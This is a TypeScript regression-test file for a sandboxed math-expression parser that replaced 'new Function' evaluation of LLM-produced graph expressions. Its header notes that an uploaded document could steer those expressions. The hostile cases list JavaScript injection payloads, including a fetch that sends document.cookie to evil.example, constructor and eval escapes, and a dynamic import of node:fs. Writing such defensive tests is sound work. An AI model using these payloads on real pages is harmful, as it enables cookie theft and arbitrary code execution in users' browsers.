import { test } from "node:test";
import assert from "node:assert/strict";
import {
  compileExpression,
  tryCompileExpression,
  ExpressionError,
  MAX_EXPRESSION_LENGTH,
} from "./mathExpression";

/**
 * Regression tests for C1. Before this parser existed, `graph.expression` —
 * a string produced by an LLM and steerable through an uploaded document —
 * was handed to `new Function`. Every case in `hostile` is something that
 * used to run as JavaScript in the learner's browser and must now be a parse
 * failure, not a value.
 */

const hostile: [string, string][] = [
  ["property access", "window.location"],
  ["nested property access", "document.cookie"],
  ["global object", "globalThis"],
  ["constructor escape", "x.constructor.constructor('return 1')()"],
  ["function constructor", "Function('return 1')()"],
  ["eval", "eval('1+1')"],
  ["fetch exfiltration", "fetch('https://evil.example/'+document.cookie)"],
  ["import", "import('node:fs')"],
  ["assignment", "x = 1"],
  ["compound assignment", "x += 1"],
  ["statement sequence", "1; alert(1)"],
  ["comma operator", "(1, alert(1))"],
  ["arrow function", "(()=>1)()"],
  ["function expression", "function(){return 1}"],
  ["template literal", "`${x}`"],
  ["string literal", "'abc'"],
  ["object literal", "{a:1}"],
  ["array literal", "[1,2,3]"],
  ["new expression", "new Date()"],
  ["optional chaining", "x?.y"],
  ["bracket access", "x['constructor']"],
  ["bitwise pipe to unknown", "x | 0 | alert"],
  ["unknown identifier", "alert(1)"],
  ["unknown identifier bare", "process"],
  ["Math with unknown member", "Math.evil(x)"],
  ["increment", "x++"],
  ["ternary", "x ? 1 : 2"],
  ["comment escape", "x /* */ ; alert(1)"],
  ["line comment", "x // alert(1)"],
  ["backslash", "x \\ 2"],
  ["semicolon", "x;"],
  ["unbalanced parens", "sin(x"],
  ["empty", ""],
  ["whitespace only", "   "],
];

for (const [name, source] of hostile) {
  test(`rejects ${name}`, () => {
    assert.throws(() => compileExpression(source), ExpressionError, `accepted: ${source}`);
  });
}

test("rejects a non-string expression", () => {
  assert.throws(() => compileExpression(null), ExpressionError);
  assert.throws(() => compileExpression({ toString: () => "x" }), ExpressionError);
});

test("rejects an over-long expression", () => {
  assert.throws(
    () => compileExpression("1+".repeat(MAX_EXPRESSION_LENGTH) + "1"),
    ExpressionError
  );
});

test("rejects an over-nested expression", () => {
  const depth = 200;
  assert.throws(
    () => compileExpression("(".repeat(depth) + "x" + ")".repeat(depth)),
    ExpressionError
  );
});

test("rejects an expression with too many tokens", () => {
  assert.throws(() => compileExpression("x+".repeat(120) + "x"), ExpressionError);
});

// --- Expressions that must still work ------------------------------------

const valid: [string, number, number][] = [
  ["x", 2, 2],
  ["x*x", 3, 9],
  ["x^2", 3, 9],
  ["x**2", 3, 9],
  ["2*x + 1", 2, 5],
  ["-x", 2, -2],
  ["(x+1)*(x-1)", 3, 8],
  ["sin(0)", 0, 0],
  ["Math.sin(0)", 0, 0],
  ["cos(0)", 0, 1],
  ["sqrt(x)", 9, 3],
  ["abs(-x)", 5, 5],
  ["exp(0)", 0, 1],
  ["log(1)", 0, 0],
  ["ln(1)", 0, 0],
  ["max(x, 3)", 1, 3],
  ["min(x, 3)", 1, 1],
  ["pow(x, 3)", 2, 8],
  ["atan2(0, 1)", 0, 0],
  ["pi", 0, Math.PI],
  ["e", 0, Math.E],
  ["1e-3", 0, 0.001],
  ["0.5*x", 4, 2],
  [".5*x", 4, 2],
  ["x % 3", 7, 1],
  ["2^3^2", 0, 512], // right-associative, as in ordinary notation
];

for (const [source, x, expected] of valid) {
  test(`evaluates ${source}`, () => {
    const fn = compileExpression(source);
    assert.ok(Math.abs(fn(x) - expected) < 1e-9, `${source} at x=${x} gave ${fn(x)}`);
  });
}

test("returns NaN rather than Infinity for undefined points", () => {
  const fn = compileExpression("1/x");
  assert.ok(Number.isNaN(fn(0)));
  assert.equal(fn(2), 0.5);
});

test("returns NaN for results outside the plottable range", () => {
  const fn = compileExpression("exp(x)");
  assert.ok(Number.isNaN(fn(1000)));
});

test("returns NaN for complex results", () => {
  const fn = compileExpression("sqrt(x)");
  assert.ok(Number.isNaN(fn(-1)));
});

test("tryCompileExpression reports failure instead of throwing", () => {
  const bad = tryCompileExpression("document.cookie");
  assert.equal(bad.ok, false);
  const good = tryCompileExpression("x+1");
  assert.equal(good.ok, true);
  if (good.ok) assert.equal(good.evaluate(1), 2);
});

test("evaluation of a hostile-looking but valid expression cannot reach globals", () => {
  // `e` is the constant, not a reference to anything in scope.
  const fn = compileExpression("e");
  assert.equal(fn(0), Math.E);
});
